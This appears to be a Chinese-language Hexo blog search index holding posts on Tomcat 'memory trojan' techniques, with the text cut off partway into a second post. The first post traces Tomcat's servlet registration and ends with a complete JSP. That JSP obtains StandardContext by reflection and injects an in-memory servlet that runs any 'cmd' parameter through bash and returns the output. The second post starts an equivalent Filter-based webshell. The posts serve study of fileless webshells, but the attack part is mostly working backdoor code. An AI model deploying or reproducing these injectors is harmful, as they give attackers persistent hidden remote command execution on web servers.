<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/11/04/tomcat-Servlet/"/>
    <url>/2022/11/04/tomcat-Servlet/</url>
    
    <content type="html"><![CDATA[<h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p><code>servletEvil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MemoryTrojan.servlets;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">servletEvil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;init&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">//            String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-comment">//            if(cmd != null)&#123;</span><br><span class="hljs-comment">//                try &#123;</span><br><span class="hljs-comment">//                    Runtime.getRuntime().exec(cmd);</span><br><span class="hljs-comment">//                &#125; catch (IOException e) &#123;&#125;</span><br><span class="hljs-comment">//            &#125;</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>            process.destroy();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>web.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;servlet&gt;<br>    &lt;servlet-name&gt;servletEvil&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;MemoryTrojan.servlets.servletEvil&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br><br>&lt;servlet-mapping&gt;<br>    &lt;servlet-name&gt;servletEvil&lt;/servlet-name&gt;<br>    &lt;url-pattern&gt;/servlet&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;<br></code></pre></td></tr></table></figure><h5 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h5><h6 id="初始化生成"><a href="#初始化生成" class="headerlink" title="初始化生成"></a>初始化生成</h6><blockquote><p>org.apache.catalina.startup.ContextConfig#configureContext</p><p>遍历从web.xml中读取的servlets,创建wrapper, wrapper设置属性:LoadOnStartup,Name,ServletClass</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (ServletDef servlet : webxml.getServlets().values()) &#123;<br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> context.createWrapper();<br>    <span class="hljs-comment">// Description is ignored</span><br>    <span class="hljs-comment">// Display name is ignored</span><br>    <span class="hljs-comment">// Icons are ignored</span><br><br>    <span class="hljs-comment">// jsp-file gets passed to the JSP Servlet as an init-param</span><br><br>    <span class="hljs-keyword">if</span> (servlet.getLoadOnStartup() != <span class="hljs-literal">null</span>) &#123;<br>        wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());<br>    &#125;<br>    <span class="hljs-keyword">if</span> (servlet.getEnabled() != <span class="hljs-literal">null</span>) &#123;<br>        wrapper.setEnabled(servlet.getEnabled().booleanValue());<br>    &#125;<br>    wrapper.setName(servlet.getServletName());<br>              Map&lt;String,String&gt; params = servlet.getParameterMap();<br>    <span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry : params.entrySet()) &#123;<br>        wrapper.addInitParameter(entry.getKey(), entry.getValue());<br>    &#125;<br>    wrapper.setRunAs(servlet.getRunAs());<br>    Set&lt;SecurityRoleRef&gt; roleRefs = servlet.getSecurityRoleRefs();<br>    <span class="hljs-keyword">for</span> (SecurityRoleRef roleRef : roleRefs) &#123;<br>        wrapper.addSecurityReference(<br>                roleRef.getName(), roleRef.getLink());<br>    &#125;<br>    wrapper.setServletClass(servlet.getServletClass());<br></code></pre></td></tr></table></figure><blockquote><p>StandardContext 添加设置好的wrapper</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">context.addChild(wrapper);<br></code></pre></td></tr></table></figure><blockquote><p>StandardContext添加 web.xml 中的 ServletMapping</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Entry&lt;String, String&gt; entry :<br>        webxml.getServletMappings().entrySet()) &#123;<br>    context.addServletMappingDecoded(entry.getKey(), entry.getValue());<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="初始化加载"><a href="#初始化加载" class="headerlink" title="初始化加载"></a>初始化加载</h6><blockquote><p>org.apache.catalina.core.StandardContext#startInternal</p><p>findChildren()返回之前添加到context中的 childs[]</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Load and initialize all &quot;load on startup&quot; servlets</span><br><span class="hljs-keyword">if</span> (ok) &#123;<br>    <span class="hljs-keyword">if</span> (!loadOnStartup(findChildren()))&#123;<br>        log.error(sm.getString(<span class="hljs-string">&quot;standardContext.servletFail&quot;</span>));<br>        ok = <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>跟进loadOnStartup()</p><p>先收集需要被初始化的servlets(loadOnStartup&gt;&#x3D;0)</p><p>然后加载收集的需要被初始化的servlets</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">loadOnStartup</span><span class="hljs-params">(Container children[])</span> &#123;<br><br>    <span class="hljs-comment">// Collect &quot;load on startup&quot; servlets that need to be initialized</span><br>    TreeMap&lt;Integer, ArrayList&lt;Wrapper&gt;&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeMap</span>&lt;&gt;();<br>    <span class="hljs-keyword">for</span> (Container child : children) &#123;<br>        <span class="hljs-type">Wrapper</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> (Wrapper) child;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">loadOnStartup</span> <span class="hljs-operator">=</span> wrapper.getLoadOnStartup();<br>        <span class="hljs-keyword">if</span> (loadOnStartup &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> Integer.valueOf(loadOnStartup);<br>        ArrayList&lt;Wrapper&gt; list = map.get(key);<br>        <span class="hljs-keyword">if</span> (list == <span class="hljs-literal">null</span>) &#123;<br>            list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            map.put(key, list);<br>        &#125;<br>        list.add(wrapper);<br>    &#125;<br><br>    <span class="hljs-comment">// Load the collected &quot;load on startup&quot; servlets</span><br>    <span class="hljs-keyword">for</span> (ArrayList&lt;Wrapper&gt; list : map.values()) &#123;<br>        <span class="hljs-keyword">for</span> (Wrapper wrapper : list) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                wrapper.load();<br>            &#125; <span class="hljs-keyword">catch</span> (ServletException e) &#123;<br>                getLogger().error(sm.getString(<span class="hljs-string">&quot;standardContext.loadOnStartup.loadException&quot;</span>,<br>                      getName(), wrapper.getName()), StandardWrapper.getRootCause(e));<br>                <span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> load errors (including a servlet that throws</span><br>                <span class="hljs-comment">// UnavailableException from the init() method) are NOT</span><br>                <span class="hljs-comment">// fatal to application startup</span><br>                <span class="hljs-comment">// unless failCtxIfServletStartFails=&quot;true&quot; is specified</span><br>                <span class="hljs-keyword">if</span>(getComputedFailCtxIfServletStartFails()) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="构造"><a href="#构造" class="headerlink" title="构造"></a>构造</h5><blockquote><p>先创建wrapper,然后设置属性:Name,ServletClass</p><p>至于LoadOnStartup属性,因为web.xml中并没有配置我们的恶意servlet,也就不会在启动时加载，实际使用时需要先访问evil.jsp动态注册，然后再访问&#x2F;servletEvil 进行懒加载，所以不需要设置此参数</p></blockquote><p><code>构造Wrapper</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> servlet.getClass().getSimpleName();<br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">newWrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    newWrapper.setName(name);<br><span class="hljs-comment">//    newWrapper.setLoadOnStartup(1);</span><br>    newWrapper.setServletClass(servlet.getClass().getName());<br></code></pre></td></tr></table></figure><blockquote><p>将wrapper添加到standardContext,并添加ServletMapping</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">standardContext.addChild(newWrapper);<br>standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/buer5ec&quot;</span>, name);<br></code></pre></td></tr></table></figure><blockquote><p>根据上面流程分析看似应该全了，那来试一下，发现失败</p></blockquote><blockquote><p>那少了什么呢？</p></blockquote><blockquote><p>直接在 servletEvil#service 下断点</p><p>找寻wrapper,发现少了instance字段</p></blockquote><p><img src="/images/image-20221104193424869.png"></p><blockquote><p>跟下instance</p></blockquote><blockquote><p>在初始化时 LoadOnStartup&gt;&#x3D;0的servlet会返回对应的instance</p></blockquote><p><img src="/images/image-20221104222613123.png"></p><blockquote><p>自己写的servlet使用时不会自启动</p><p>访问 &#x2F;servlet </p><p>该过程中会实例化servlet返回instance   &#x2F;&#x2F;懒加载</p></blockquote><p><img src="/images/image-20221104222309861.png"></p><blockquote><p>也就是说有了instance，servlet动态注册才算真正完成，可直接访问此路由，相当于LoadOnStartup&gt;&#x3D;0 自启动了</p><p>而上面尝试失败的原因大抵是访问&#x2F;servlet 时instance创建失败</p></blockquote><blockquote><p>instance如何设置?</p><p>org.apache.catalina.core.StandardWrapper 包含了setServlet方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Set the associated servlet instance.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setServlet</span><span class="hljs-params">(Servlet servlet)</span> &#123;<br>    instance = servlet;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>构造wrapper</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> servlet.getClass().getSimpleName();<br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">newWrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    newWrapper.setName(name);<br><span class="hljs-comment">//    newWrapper.setLoadOnStartup(1);</span><br>    newWrapper.setServlet(servlet);<br>    newWrapper.setServletClass(servlet.getClass().getName());<br></code></pre></td></tr></table></figure><p><strong>整体流程</strong></p><blockquote><p>1.找到StandardContext<br>2.准备恶意servlet</p><p>3.创建 Wapper 对象并设置属性:Name,ServletClass</p><p>4.恶意servlet添加到wrapper &#x2F;&#x2F;instance</p><p>5.将wrapper添加到StandardContext<br>6.StandardContext添加 ServletMapping</p></blockquote><h5 id="完整内存马"><a href="#完整内存马" class="headerlink" title="完整内存马"></a>完整内存马</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br><br>&lt;%<br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">S</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Servlet</span>&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title function_">getServletConfig</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><span class="hljs-comment">//            String cmd = req.getParameter(&quot;cmd&quot;);</span><br><span class="hljs-comment">//            if(cmd != null)&#123;</span><br><span class="hljs-comment">//                try &#123;</span><br><span class="hljs-comment">//                    Runtime.getRuntime().exec(cmd);</span><br><span class="hljs-comment">//                &#125; catch (IOException e) &#123;&#125;</span><br><span class="hljs-comment">//            &#125;</span><br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>                <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>                servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, len));<br>                process.destroy();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getServletInfo</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>        &#125;<br>    &#125;<br>%&gt;<br><br>&lt;%<br>    <span class="hljs-comment">// ServletContext servletContext =  request.getServletContext();</span><br>    <span class="hljs-comment">// Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br>    <span class="hljs-comment">// appctx.setAccessible(true);</span><br>    <span class="hljs-comment">// ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br>    <span class="hljs-comment">// Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br>    <span class="hljs-comment">// stdctx.setAccessible(true);</span><br>    <span class="hljs-comment">// StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><br>    <span class="hljs-comment">// 更简单的方法 获取StandardContext</span><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">reqF</span> <span class="hljs-operator">=</span> request.getClass().getDeclaredField(<span class="hljs-string">&quot;request&quot;</span>);<br>    reqF.setAccessible(<span class="hljs-literal">true</span>);<br>    <span class="hljs-type">Request</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (Request) reqF.get(request);<br>    <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) req.getContext();<br><br>    <span class="hljs-type">S</span> <span class="hljs-variable">servlet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">S</span>();<br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> servlet.getClass().getSimpleName();<br>    <span class="hljs-type">Wrapper</span> <span class="hljs-variable">newWrapper</span> <span class="hljs-operator">=</span> standardContext.createWrapper();<br>    newWrapper.setName(name);<br><span class="hljs-comment">//    newWrapper.setLoadOnStartup(1);</span><br>    newWrapper.setServlet(servlet);<br>    newWrapper.setServletClass(servlet.getClass().getName());<br>    standardContext.addChild(newWrapper);<br>    standardContext.addServletMappingDecoded(<span class="hljs-string">&quot;/buer5ec&quot;</span>, name);<br><br>    out.println(<span class="hljs-string">&quot;inject success&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat-filter 内存马</title>
    <link href="/2022/11/01/tomcat-filter/"/>
    <url>/2022/11/01/tomcat-filter/</url>
    
    <content type="html"><![CDATA[<h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><h5 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h5><p><code>filterEvil.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> MemoryTrojan.filters;<br><span class="hljs-keyword">import</span> javax.servlet.Filter;<br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">filterEvil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        System.out.println(<span class="hljs-string">&quot;filter init&quot;</span>);<br><span class="hljs-comment">//        Filter.super.init(filterConfig);</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>        <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)).start();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> process.getInputStream().read(bytes);<br>            servletResponse.getWriter().write(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes,<span class="hljs-number">0</span>,len));<br>            process.destroy();<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        filterChain.doFilter(servletRequest,servletResponse);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;filter destroy&quot;</span>);<br><span class="hljs-comment">//        Filter.super.destroy();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>web.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 